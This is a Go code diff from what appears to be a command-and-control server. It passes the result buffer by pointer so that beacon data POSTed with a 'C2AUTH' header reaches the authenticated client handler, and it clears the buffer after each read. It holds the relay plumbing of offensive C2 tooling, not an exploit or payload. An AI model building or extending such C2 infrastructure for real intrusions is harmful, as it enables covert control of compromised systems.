@@ -19,14 +19,14 @@ const (
 	NEWBEACON = 0x00000003
 )
 
-func StartC2(uri string, port int, res []byte) {
+func StartC2(uri string, port int, res *[]byte) {
 	http.HandleFunc("/"+uri, func(w http.ResponseWriter, r *http.Request) {
 		iamfrom := r.Header.Get("Iamfrom")
 		if iamfrom == "C2AUTH" {
 			if r.Method == http.MethodPost {
 				body, _ := ioutil.ReadAll(r.Body)
 				w.WriteHeader(http.StatusOK)
-				res = body
+				*res = body
 				return
 			} else {
 				w.WriteHeader(http.StatusForbidden)
@@ -48,7 +48,7 @@ func StartC2(uri string, port int, res []byte) {
 func StartClient(uri string, port int) {
 	config, _ := parseConfig("./Client/config.xml")
 	var res []byte // dong tai jie shou 40049
-	go StartC2("c2", 50049, res)
+	go StartC2("c2", 50049, &res)
 	http.HandleFunc("/"+uri, func(w http.ResponseWriter, r *http.Request) {
 
 		username := r.Header.Get("Username")
@@ -56,13 +56,17 @@ func StartClient(uri string, port int) {
 
 		if authenticate(username, password, config) {
 			body, _ := ioutil.ReadAll(r.Body)
+
+			printkey(res)
 			if body == nil {
 				w.WriteHeader(http.StatusOK)
 				w.Write(res)
+				res = make([]byte, 0)
 			} else {
 				Send_Bytes_to(w, body, "http://localhost:8080", expectedHeaders)
 				w.WriteHeader(http.StatusOK)
 				w.Write(res)
+				res = make([]byte, 0)
 			}
 
 		} else {
